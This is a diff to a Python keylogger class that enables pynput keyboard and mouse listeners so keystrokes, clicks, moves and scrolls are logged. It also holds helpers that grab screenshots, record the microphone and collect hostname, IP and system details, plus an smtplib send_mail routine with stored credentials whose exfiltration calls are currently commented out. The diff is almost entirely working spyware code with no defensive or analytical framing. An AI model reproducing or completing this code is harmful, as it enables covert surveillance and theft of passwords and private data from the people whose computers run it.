@@ -3,12 +3,13 @@ import os
 import platform
 import smtplib
 import socket
+import time
+
 # import threading
 import wave
 import pyscreenshot
 import sounddevice as sd
-# from pynput import keyboard
-# from pynput.keyboard import Listener
+from pynput import keyboard, mouse
 from dotenv import load_dotenv
 # from email import encoders
 # from email.mime.base import MIMEBase
@@ -29,24 +30,29 @@ SEND_REPORT_EVERY = 10  # seconds
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
+        self.keyboard_listener = None
+        self.mouse_listener = None
         self.interval = time_interval
         self.log = "KeyLogger Started...\n"
         self.email = email
         self.password = password
 
     def appendlog(self, string):
-        self.log = self.log + string
+        if string:
+            self.log = self.log + string
 
     def on_move(self, x, y):
-        current_move = logging.info("Mouse moved to {} {}".format(x, y))
+        current_move = "\nMouse moved to {} {}".format(x, y)
         self.appendlog(current_move)
 
-    def on_click(self, x, y):
-        current_click = logging.info("Mouse moved to {} {}".format(x, y))
+    def on_click(self, x, y, button, pressed):
+        current_click = "\nMouse click at {} {} with button {}".format(x, y, button)
         self.appendlog(current_click)
 
-    def on_scroll(self, x, y):
-        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+    def on_scroll(self, x, y, dx, dy):
+        current_scroll = "\nMouse scrolled at {} {} with scroll distance {} {}".format(
+            x, y, dx, dy
+        )
         self.appendlog(current_scroll)
 
     def save_data(self, key):
@@ -60,7 +66,7 @@ class KeyLogger:
             else:
                 current_key = " " + str(key) + " "
 
-        self.appendlog(current_key)
+        self.appendlog("\nPressed key: {0}".format(current_key))
 
     def send_mail(self, email, password, message):
         m = f"""\
@@ -79,6 +85,8 @@ class KeyLogger:
         # self.send_mail(self.email, self.password, "\n\n" + self.log)
         print(self.log)
         self.log = ""
+        self.keyboard_listener.stop()
+        self.mouse_listener.stop()
         # timer = threading.Timer(self.interval, self.report)
         # timer.start()
 
@@ -88,11 +96,11 @@ class KeyLogger:
         processor = platform.processor()
         system = platform.system()
         machine = platform.machine()
-        self.appendlog("hostname = " + hostname + "\n")
-        self.appendlog("ip = " + ip + "\n")
-        self.appendlog("processor = " + processor + "\n")
-        self.appendlog("system = " + system + "\n")
-        self.appendlog("machine = " + machine + "\n")
+        self.appendlog("\nhostname = " + hostname)
+        self.appendlog("\nip = " + ip)
+        self.appendlog("\nprocessor = " + processor)
+        self.appendlog("\nsystem = " + system)
+        self.appendlog("\nmachine = " + machine)
 
     def microphone(self):
         fs = 44100
@@ -100,31 +108,32 @@ class KeyLogger:
         seconds = SEND_REPORT_EVERY
         obj = wave.open("sound.wav", "w")
         obj.setnchannels(channels)  # mono
-        obj.setsampwidth(2) # Sampling of 16 bit
+        obj.setsampwidth(2)  # Sampling of 16 bit
         obj.setframerate(fs)
-        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=channels, dtype='int16')
+        myrecording = sd.rec(
+            int(seconds * fs), samplerate=fs, channels=channels, dtype="int16"
+        )
         sd.wait()
         obj.writeframesraw(myrecording)
-        self.appendlog("microphone used.\n")
+        self.appendlog("\nmicrophone used.")
 
         # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
 
     def screenshot(self):
         img = pyscreenshot.grab()
         img.save("screenshot.png")
-        self.appendlog("screenshot used.\n")
-        
+        self.appendlog("\nscreenshot used.")
+
         # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
 
     def run(self):
-        # keyboard_listener = keyboard.Listener(on_press=self.save_data)
-        # with keyboard_listener:
-        #     self.report()
-        #     keyboard_listener.join()
-        # with Listener(
-        #     on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
-        # ) as mouse_listener:
-        #     mouse_listener.join()
+        self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
+        self.keyboard_listener.start()
+
+        self.mouse_listener = mouse.Listener(
+            on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
+        )
+        self.mouse_listener.start()
 
         # if os.name == "nt":
         #     try:
@@ -146,9 +155,10 @@ class KeyLogger:
         #     except OSError:
         #         print("File is close.")
 
-        self.system_information()
+        # self.system_information()
         # self.screenshot()
-        self.microphone()
+        # self.microphone()
+        time.sleep(10)
         self.report()
 
 
